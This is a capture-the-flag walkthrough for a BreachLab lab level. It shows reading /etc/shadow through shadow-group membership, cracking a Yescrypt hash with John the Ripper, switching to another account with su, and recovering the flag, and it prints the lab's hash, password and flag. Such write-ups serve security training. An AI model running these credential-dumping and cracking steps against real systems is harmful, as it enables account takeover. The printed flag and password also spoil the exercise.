# BreachLab - Phantom Track: Level 5 (File Authority)

## General Information

- **Platform:** [BreachLab](https://breachlab.org)
- **Track:** Phantom Track (Post-Exploitation & Operational Tradecraft)
- **Level:** Level 5 (File Authority)
- **Host:** `204.168.229.209`
- **Port:** `2223`
- **Current User:** `phantom5`
- **Compromised User:** `flagkeeper5`
- **Cracked Password:** `princess`
- **Goal:** Audit dangerous group memberships (`shadow`), dump cryptographic password hashes from `/etc/shadow`, crack modern Yescrypt (`$y$`) hashes, and pivot horizontally to `flagkeeper5`
- **Next User / Flag Code:** `bl_phtm5_3ce7637c1fa31cb2`

---

## 1. Scenario & Objectives

Upon logging in via SSH, the MOTD banner and `BRIEFING` outline the mission parameters:

```
MISSION: File Authority
=======================

Your user belongs to an interesting group. Groups determine what
you can access. Some groups should never be given to regular users.

Check your groups. Understand what they allow. Read what you
should not be able to read. Crack it.

Root is locked on this box — the only crackable hash in the shadow
file belongs to a different account, which is also your pivot target
and owns the flag.
```

The objective is to audit local group memberships, identify privileged group assignments (`42(shadow)`), extract password hashes from `/etc/shadow`, perform offline dictionary attacks against Yescrypt hashes using John the Ripper (`--format=crypt`), horizontally pivot via `su flagkeeper5`, and extract `/var/lib/phantom-flags/level5_flag`.

---

## 2. Reconnaissance & Group Privilege Enumeration

Logging in via SSH as `phantom5` and inspecting user identity and group memberships:

```bash
phantom5@phantom:~$ id
uid=1005(phantom5) gid=1005(phantom5) groups=1005(phantom5),42(shadow)
```

### Forensic Analysis of `/etc/shadow` Permissions

In Linux systems, user password hashes are stored in `/etc/shadow` with restricted access permissions:

```bash
phantom5@phantom:~$ ls -la /etc/shadow
-rw-r----- 1 root shadow 5032 May 28 16:07 /etc/shadow
```

- **File Permissions:** `-rw-r-----` (`640`), owned by `root:shadow`.
- **Misconfiguration:** Assigning an unprivileged user (`phantom5`) to the `shadow` group grants direct read access to `/etc/shadow`, bypassing the intended superuser-only privacy of authentication hashes.

### Dumping `/etc/shadow` Hashes

Reading `/etc/shadow` reveals the password hash for the pivot target `flagkeeper5`:

```bash
phantom5@phantom:~$ cat /etc/shadow
...
flagkeeper5:$y$j9T$TeZ0Ix7uvzXIRh8FowsKn1$z8WsnIs4dJvaDLVvRFRAQH7MgkcoIm/VN38BJTQGTq3:20601:0:99999:7:::
...
```

---

## 3. Cryptographic Hash Analysis: Yescrypt (`$y$`)

The target hash starts with the prefix **`$y$`**:

```
$y$j9T$TeZ0Ix7uvzXIRh8FowsKn1$z8WsnIs4dJvaDLVvRFRAQH7MgkcoIm/VN38BJTQGTq3
```

- **Algorithm:** **Yescrypt** (modern default password hashing scheme in Debian 12 / Ubuntu 22.04+).
- **Design:** Yescrypt is a memory-hard password hashing function based on *scrypt*. Unlike SHA-512 (`$6$`) or MD5 (`$1$`), Yescrypt demands substantial CPU cycles and physical RAM per hash computation, severely mitigating GPU-accelerated mass brute-forcing.

---

## 4. Offline Password Cracking

### 4.1. Dictionary Setup (Kali Linux)

On the local attacking host, ensure the `rockyou.txt` wordlist is uncompressed:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

### 4.2. Formatting and Cracking with John the Ripper

Due to strict salt and format validation discrepancies in Hashcat's raw `-m 23400` parser, we use **John the Ripper** with the generic `--format=crypt` engine. This delegates hash validation directly to the host's native `crypt(3)` library implementation in `glibc`:

```bash
# 1. Create standard shadow format input
printf 'flagkeeper5:$y$j9T$TeZ0Ix7uvzXIRh8FowsKn1$z8WsnIs4dJvaDLVvRFRAQH7MgkcoIm/VN38BJTQGTq3\n' > /tmp/hash.txt

# 2. Launch dictionary attack against the crypt(3) engine
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
```

### Cracking Output:

```
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Will run 16 OpenMP threads
princess         (flagkeeper5)
1g 0:00:00:00 DONE (2026-06-05 15:11) 3.703g/s 355.5p/s
```

- **Recovered Plaintext Password:** `princess`

---

## 5. Lateral Pivoting & Flag Retrieval

Returning to the target machine, we switch to `flagkeeper5` using the recovered credentials:

```bash
phantom5@phantom:~$ su flagkeeper5
Password: princess

flagkeeper5@phantom:/home/phantom5$ whoami
flagkeeper5

flagkeeper5@phantom:/home/phantom5$ cat /var/lib/phantom-flags/level5_flag
bl_phtm5_3ce7637c1fa31cb2
```

---

## 6. Flag / Credentials Retrieved

| Parameter | Value |
| :--- | :--- |
| **Track** | Phantom Track (Level 5) |
| **Current User** | `phantom5` |
| **Dangerous Group** | `42(shadow)` |
| **Compromised User** | `flagkeeper5` |
| **Hash Algorithm** | Yescrypt (`$y$`) |
| **Recovered Password** | `princess` |
| **Discovered Flag** | `bl_phtm5_3ce7637c1fa31cb2` |
| **Artifact Path** | `/var/lib/phantom-flags/level5_flag` |

---

## 7. Key Commands & Concepts Reference

- `id`: Display current user UID, GID, and supplementary group memberships.
- `cat /etc/shadow`: View authentication hashes (readable due to `shadow` group membership).
- `john --format=crypt --wordlist=<wordlist> <hashfile>`: Crack modern Linux hashes via dynamic `crypt(3)` library delegation.
- `su <user>`: Switch user identity via password authentication.

---

## 8. Lessons Learned & Defensive Takeaways

1. **Strict Group Membership Governance:** Dangerous system groups such as `shadow`, `disk` (raw block device access), `docker` (instant container escape to root), or `sudo`/`wheel` should never be assigned to unprivileged users or automated service accounts.
2. **Yescrypt Defense against Mass Cracking:** Yescrypt's memory-hardness significantly slows down high-performance GPU cracking rigs; however, weak passwords (`princess`) remain susceptible to standard dictionary attacks.
3. **Horizontal Pivoting in Lateral Movement:** Gaining access to peer accounts broadens situational awareness, unlocks user-specific files, and expands the attack surface toward full root compromise.
